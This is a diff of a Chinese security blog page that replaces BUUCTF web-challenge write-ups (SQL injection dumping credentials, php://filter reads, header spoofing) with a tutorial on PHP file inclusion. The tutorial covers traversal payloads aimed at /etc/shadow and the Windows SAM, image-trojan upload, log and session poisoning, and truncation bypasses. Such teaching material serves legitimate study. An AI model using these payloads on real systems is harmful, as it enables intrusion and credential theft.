@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="BUUCTF WP（1）, CTF,web,php,java,linux等">
-    <meta name="description" content="刷题wp">
+    <meta name="keywords" content="文件包含漏洞, CTF,web,php,java,linux等">
+    <meta name="description" content="常用漏洞之一">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -28,7 +28,7 @@
     </style>
 
 
-    <title>BUUCTF WP（1） | 哇咔哇咔Blog</title>
+    <title>文件包含漏洞 | 哇咔哇咔Blog</title>
     <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/guixinchn/image/blog/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -478,12 +478,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">BUUCTF WP（1）</h1>
+                    <h1 class="description center-align post-title">文件包含漏洞</h1>
                 </div>
             </div>
         </div>
@@ -599,8 +599,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/buuctf/">
-                                <span class="chip bg-color">buuctf</span>
+                            <a href="/tags/web%E6%BC%8F%E6%B4%9E/">
+                                <span class="chip bg-color">web漏洞</span>
                             </a>
                         
                     </div>
@@ -638,14 +638,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.6k
+                    1.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    6 分
+                    5 分
                 </div>
                 
 
@@ -665,69 +665,103 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>打开后是一个登录框，直接尝试万能密码</p>
+                <p><strong>原理</strong>：<br>文件包含漏洞的产生原因是在通过 PHP 的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。<br>这个漏洞最重要的有四个函数：</p>
 <blockquote>
-<p>（用户名：1’ or 1=1 #  密码：随便输）</p>
+<p>1、include() 当使用该函数包含文件时，只有代码执行到 include()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。<br>2、include_once() 功能和 include()相同，区别在于当重复调用同一文件时，程序只调用一次。<br> 3、require()<br>只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行<br>4、require_once() 它的功能与 require() 相同，区别在于当重复调用同一文件时，程序只调用一次。</p>
 </blockquote>
-<p>登录得到flag<br><img src="https://img-blog.csdnimg.cn/b5a22f65f9424e8a89023f063e8f792c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU,size_19,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>这里的万能密码是为什么呢？</strong><br>数据库中的查询语句：</p>
-<pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> id <span class="token keyword">from</span> users <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">''</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">--  and password = '456'</span>
+<p>当使用这四个函数包含一个新文件时，该文件将作为 PHP 代码执行，php 内核并不在意该被包含的文件是什么类型。所以如果被包含的是 txt 文件、图片文件、远程 url、也都将作为 PHP 代码执行。<br><strong>分类：</strong><br>文件包含分为两种种类，<code>RFI (远程文件包含)</code>和 <code>LFI（本地文件包含漏洞）</code>，两者的主要区别在于php.ini中是否开启了<code>allow_url_include</code>.如果开启了就有可能是远程文件包含<br>注意：在php.ini中<code>allow_url_fopen</code>默认都是on，而<code>allow_url_include</code>在php5.2之后默认是off</p>
+<h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><p><em><strong>常见的敏感信息路径：</strong></em></p>
+<p><strong>Windows系统</strong></p>
+<pre class=" language-php"><code class="language-php"> c<span class="token punctuation">:</span>\<span class="token package">boot</span><span class="token punctuation">.</span>ini <span class="token comment" spellcheck="true">// 查看系统版本</span>
+
+ c<span class="token punctuation">:</span>\<span class="token package">windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>inetsrv<span class="token punctuation">\</span>MetaBase</span><span class="token punctuation">.</span>xml <span class="token comment" spellcheck="true">// IIS配置文件</span>
+ 
+c<span class="token punctuation">:</span>\<span class="token package">windows<span class="token punctuation">\</span>repair<span class="token punctuation">\</span>sam</span> <span class="token comment" spellcheck="true">// 存储Windows系统初次安装的密码 c:\ProgramFiles\mysql\my.ini // MySQL配置</span>
+ 
+c<span class="token punctuation">:</span>\<span class="token package">ProgramFiles<span class="token punctuation">\</span>mysql<span class="token punctuation">\</span>data<span class="token punctuation">\</span>mysql<span class="token punctuation">\</span>user</span><span class="token punctuation">.</span><span class="token constant">MYD</span> <span class="token comment" spellcheck="true">// MySQL root密码</span>
+
+c<span class="token punctuation">:</span>\<span class="token package">windows<span class="token punctuation">\</span>php</span><span class="token punctuation">.</span>ini <span class="token comment" spellcheck="true">// php 配置信息</span>
 </code></pre>
-<p>又 这里呢1=1永远为真,后面 and password = ‘456’被注释掉了。数据库不需要考虑,这里我们就跳过了验证。<br><strong>绕圈子的写法</strong><br>尝试输入用户名和密码，在用户名和密码处输入正常数字时显示<strong>NO,Wrong username password！！！</strong> 但是在用户名和密码处输入数字加上’时页面报错，尝试换成数字+)没有报错，所以判断存在sql注入并且闭合符号为’</p>
-<p><strong>接着查询字段数</strong></p>
-<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//0c01d356-491f-4f75-be44-ec8e20c6661c.node4.buuoj.cn:81/check.php?``username=1' order by 4%23&amp;password=1</span>
+<p><strong>Linux/Unix系统</strong></p>
+<pre class=" language-php"><code class="language-php"><span class="token operator">/</span>etc<span class="token operator">/</span>passwd <span class="token comment" spellcheck="true">// 账户信息</span>
+
+<span class="token operator">/</span>etc<span class="token operator">/</span>shadow <span class="token comment" spellcheck="true">// 账户密码文件</span>
+
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>app<span class="token operator">/</span>apache2<span class="token operator">/</span>conf<span class="token operator">/</span>httpd<span class="token punctuation">.</span>conf <span class="token comment" spellcheck="true">// Apache2默认配置文件</span>
+
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>app<span class="token operator">/</span>apache2<span class="token operator">/</span>conf<span class="token operator">/</span>extra<span class="token operator">/</span>httpd<span class="token operator">-</span>vhost<span class="token punctuation">.</span>conf <span class="token comment" spellcheck="true">// 虚拟网站配置</span>
+
+<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>app<span class="token operator">/</span>php5<span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token punctuation">.</span>ini <span class="token comment" spellcheck="true">// PHP相关配置</span>
+
+<span class="token operator">/</span>etc<span class="token operator">/</span>httpd<span class="token operator">/</span>conf<span class="token operator">/</span>httpd<span class="token punctuation">.</span>conf <span class="token comment" spellcheck="true">// Apache配置文件</span>
+
+<span class="token operator">/</span>etc<span class="token operator">/</span>my<span class="token punctuation">.</span>conf <span class="token comment" spellcheck="true">// mysql 配置文件</span>
+
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>access<span class="token punctuation">.</span>log 查看相应日志文件，文件日志默认地址
+
+（可通过抓包查看得知服务器为Ubuntu，由nginx搭建的网站，nginx的日志文件默认地址在<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>access<span class="token punctuation">.</span>log和<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>error<span class="token punctuation">.</span>log，其中本题中access<span class="token punctuation">.</span>log可以打开）
 </code></pre>
-<p><strong>查询注入点</strong></p>
-<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//0c01d356-491f-4f75-be44-ec8e20c6661c.node4.buuoj.cn:81/check.php?username=1' union select 1,2,3%23&amp;password=1</span>
+<p><strong>包含同目录下的文件</strong></p>
+<pre class=" language-php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>test<span class="token punctuation">.</span>txt
 </code></pre>
-<p>这时已经爆出了flag<br><img src="https://img-blog.csdnimg.cn/69532769d2c64d4aa9ac0c4e9e7379a9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
-<h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>打开后一个挺好玩的网站，查看源代码，拉到底发现是一个简单的get传值，<br><img src="https://img-blog.csdnimg.cn/5630452ca3944a44b33208c60727819a.png"><br>直接输入<code>?cat=dog</code>可以得到flag</p>
-<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>是个网站，先查看源代码，发现有一个可以点的网站，点开进入<br><img src="https://img-blog.csdnimg.cn/0225516aa91d4d478ba331f44617bbac.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU,size_14,color_FFFFFF,t_70,g_se,x_16"><br>按钮点了之后会迅速返回到这里<br><img src="https://img-blog.csdnimg.cn/1b2d616a797d461ea8f31ac97b5e16a9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU,size_9,color_FFFFFF,t_70,g_se,x_16"><br>尝试抓包，看看有没有有用的信息，抓包发现有一个文件，访问<br><img src="https://img-blog.csdnimg.cn/9f6aa5759f3642cbaa7d25eb37362587.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU,size_15,color_FFFFFF,t_70,g_se,x_16"><br>访问后又发现一个提示<br><img src="https://img-blog.csdnimg.cn/c0c586d0be7f4d189f6c0e37fc026f79.png"><br>访问flag.php发现什么也没有，这里思路断了不知道咋那么写了，查看别人的wp发现要用到<strong>filter伪协议</strong>没见过，去百度搜了下，这里用到的是base过滤器：<br><strong>base64的编码转换操作，例如：</strong></p>
-<pre class=" language-php"><code class="language-php"><span class="token function">file_get_contents</span><span class="token punctuation">(</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resource=data://text/plain,m1sn0w");</span>
+<p>目录遍历</p>
+<pre class=" language-php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>test<span class="token punctuation">.</span>txt
 </code></pre>
-<p><code>Quoted-printable</code>可译为可打印字符引用编码，可以理解为将一些不可打印的ASCII字符进行一个编码转换，转换成=后面跟两个十六进制数，例如：</p>
-<pre class=" language-php"><code class="language-php"><span class="token function">file_get_contents</span><span class="token punctuation">(</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.quoted-printable-encode/resource=data://text/plain,m1sn0w".chr(12));</span>
- 输出为m1sn0w<span class="token operator">=</span><span class="token constant">0C</span>
+<p><code>./</code>当前目录<code>../</code>上一级目录，这样的遍历目录来读取文件<br><strong>包含图片木马</strong><br>cmd命令执行：</p>
+<pre class=" language-php"><code class="language-php">copy x<span class="token punctuation">.</span>jpg <span class="token operator">/</span>b <span class="token operator">+</span> s<span class="token punctuation">.</span>php <span class="token operator">/</span>b f<span class="token punctuation">.</span>jpg
 </code></pre>
-<p>摘自大佬博客：<a href="https://cxymm.net/article/gental_z/122303393" target="_blank" rel="noopener">https://cxymm.net/article/gental_z/122303393</a><br>所以这里要构造语句</p>
-<pre class=" language-php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/convert.base64-encode/resource=flag.php</span>
+<p>上传f.jpg,找到f.jpg路径，包含f.jpg<br><strong>包含日志</strong><br><strong>利用条件</strong>：需要知道服务器日志的储存路径，并且日志文件可读。一般情况下，日志保存路径在<code>/var/log/apache2/</code></p>
+<pre class=" language-php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>car<span class="token operator">/</span>log<span class="token operator">/</span>apacher<span class="token operator">/</span>error<span class="token punctuation">.</span>log
 </code></pre>
-<p>可以得到一长串base密码，找个网站解密可以得到flag<br><img src="https://img-blog.csdnimg.cn/17fe9e14b3d746b4971b622df600de80.png"></p>
-<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>打开后发现是一个登录框，尝试万能密码<br>可以得到这个<br><img src="https://img-blog.csdnimg.cn/bee5b6c898214158adcb2b3325067350.png"><br>尝试登陆，果然登不上<br>那就sql注入，查询字符段</p>
-<pre class=" language-sql"><code class="language-sql">?username<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>passward<span class="token operator">=</span><span class="token number">1</span>
+<p>1.提交下面请求，把payload插入日志<br><img src="https://img-blog.csdnimg.cn/53e0911a604c42e6bbdc6853546e3d27.png"></p>
+<p>2.可以尝试利用UA插入payload到日志文件</p>
+<p><img src="https://img-blog.csdnimg.cn/25140bbd98c64aa8a8c413d321da2619.png"><br><strong>包含session</strong><br><strong>利用条件</strong>：session文件路径已知，且其中内容部分可控<br>php默认生成的session文件一般都放在/tmp目录下</p>
+<pre class=" language-php"><code class="language-php"><span class="token operator">/</span>tmp<span class="token operator">/</span>sess_SESSIONID
+<span class="token operator">?</span>file<span class="token operator">=</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>tmp<span class="token operator">/</span>sess_tnrdo9ub2tsdurntv0pdir1no7
 </code></pre>
-<pre class=" language-sql"><code class="language-sql">?username<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>passward<span class="token operator">=</span><span class="token number">1</span>
+<p>session文件一般在<code>/tmp</code>目录下,格式为<code>sess_[your phpsessid value]</code>,有时候也可能在/var/lib/php5之类的，所以在此之前建议先读取配置文件，在某些特定的情况下也许可以控制session的值，并且获得一个shell<br><strong>有防御的本地文件包含</strong><br>代码审计中可以看见这样的包含模板文件:</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token string">'/var/www/html/'</span> <span class="token punctuation">.</span><span class="token variable">$file</span><span class="token punctuation">.</span><span class="token string">'/test/test.php'</span><span class="token punctuation">;</span><span class="token delimiter">?></span>
 </code></pre>
-<p>4时报错，字段数为3<br>然后查询注入点</p>
-<pre class=" language-sql"><code class="language-sql">?username<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span>
+<p>这段代码指定了前缀和后缀：这样就很难直接去包含前面提到的种种文件<br><strong>1.%00截断</strong><br>PHP内核是由C语言实现的，所以使用C语言中的一些字符串处理函数，在连接字符串时，0字节（\x00）将作为字符串的结束符，所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串。一般很少用</p>
+<pre class=" language-php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>etc<span class="token operator">/</span>passwd<span class="token operator">%</span><span class="token number">00</span>
 </code></pre>
-<p><img src="https://img-blog.csdnimg.cn/979f4ba5178249a799fbb72d3807e2a3.png"><br>得到回显点位为2和3，查询当前数据库名及版本：</p>
-<pre class=" language-sql"><code class="language-sql">?username<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span>
+<p>需要magic_quotes_gpc=off,PHP小于5.3.4有效<br><strong>2.%00截断目录遍历</strong></p>
+<pre class=" language-php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span><span class="token operator">%</span><span class="token number">00</span>
 </code></pre>
-<p><img src="https://img-blog.csdnimg.cn/11f1cc3ca7ab47398500bfa37cd87455.png"><br>然后爆表</p>
-<pre class=" language-sql"><code class="language-sql">?username<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span>
+<p>需要 magic_quotes_gpc=off，unix 文件系统，比如 FreeBSD，OpenBSD，NetBSD，Solaris<br><strong>3.路径长度截断</strong></p>
+<pre class=" language-php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>etc<span class="token operator">/</span>passwd<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">[</span>…<span class="token punctuation">]</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span>
 </code></pre>
-<p><img src="https://img-blog.csdnimg.cn/a1e72bf8ea0f43faaee0c8a1dcdb9aa6.png"><br>爆字段，先爆l0ve1ysq1这个表</p>
-<pre class=" language-sql"><code class="language-sql">?username<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='</span>l0ve1ysq1'<span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span>
+<p>php 版本小于 5.2.8 可以成功，linux 需要文件名长于 4096，windows 需要长于 256；利用操作系统对目录最大长度的限制，可以不需要 0 字节而达到截断的目的。目录字符串，在 window 下 256 字节、linux 下 4096 字节时会达到最大值，最大值长度之后的字符将被丢弃。而利用 “./“ 的方式即可构造出超长目录字符串:<br><strong>4.点号截断：</strong></p>
+<pre class=" language-php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>boot<span class="token punctuation">.</span>ini<span class="token operator">/</span>………<span class="token punctuation">[</span>…<span class="token punctuation">]</span>…………
 </code></pre>
-<p><img src="https://img-blog.csdnimg.cn/bdc9f93a895c41b09a1a23800ecc8b5a.png"><br>最后爆数据，得到flag</p>
-<pre class=" language-sql"><code class="language-sql">?username<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> l0ve1ysq1<span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span>
+<p>php版本小于5.2.8可以成功，只适用于windows，电耗长度要长于256<br><strong>5.编码绕过</strong><br>服务器端常常会对于<code>../</code>做一些过滤，这时可以用一些编码绕过<br>利用 url 编码：</p>
+<pre class=" language-php"><code class="language-php"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span> <span class="token operator">-</span>》 <span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">%</span>2f <span class="token operator">-</span>》 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">%</span>2f <span class="token operator">-</span>》 <span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span>\ <span class="token operator">-</span>》 <span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">%</span>5c <span class="token operator">-</span>》 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">%</span>5c <span class="token operator">-</span>》 <span class="token operator">%</span>2e<span class="token operator">%</span>2e\
 </code></pre>
-<p><img src="https://img-blog.csdnimg.cn/b0309fb0b7254f4f88b64ed0b8a7f5ef.png"></p>
-<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>题目提示很明显了是要用菜刀或者蚁剑<br>csdn上有详细的安装教程，很简单，配置好后打开蚁剑，输入网址，链接密码是Syc，连接后在目录栏找到flag<br><img src="https://img-blog.csdnimg.cn/ef85f66e7c954476aeb8fd02e3f117ee.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
-<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>打开题目是一个网站，查看源代码找到一个文件，点开<br><img src="https://img-blog.csdnimg.cn/d35d43cd9e53485d8c912af868a6a654.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU,size_20,color_FFFFFF,t_70,g_se,x_16"><br><img src="https://img-blog.csdnimg.cn/615c8a26e4c744e0a5bfaa13123aa94d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU,size_20,color_FFFFFF,t_70,g_se,x_16"><br>一串英文，能看懂，但是不影响我不会做，查看别人的wp，发现说这个来源不对，这里就需要改http的header，添加一个Referer的头<br><img src="https://img-blog.csdnimg.cn/bc41ecfa387f47819edea1c9dfe97d71.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU,size_20,color_FFFFFF,t_70,g_se,x_16"><br>得到一个新提示，要用Syclover打开修改后得到新提示<br><img src="https://img-blog.csdnimg.cn/26568d1c3b9c4c6f81455c98f9455246.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU,size_20,color_FFFFFF,t_70,g_se,x_16"><br>必须从本地访问，然后看懂了不会修改，查看别人的wp发现要用一个没有的字段X-Forwarded-For:，代表从访问者的地址，后面加上127.0.0.1，得到flag<br><img src="https://img-blog.csdnimg.cn/df6f19fe865f494c914d95d57c5450d7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU5ZOH5ZKU,size_20,color_FFFFFF,t_70,g_se,x_16"><br>这里有burp的学习网站可以借鉴一下：<a href="https://www.iculture.cc/cybersecurity/pig=11474" target="_blank" rel="noopener">https://www.iculture.cc/cybersecurity/pig=11474</a></p>
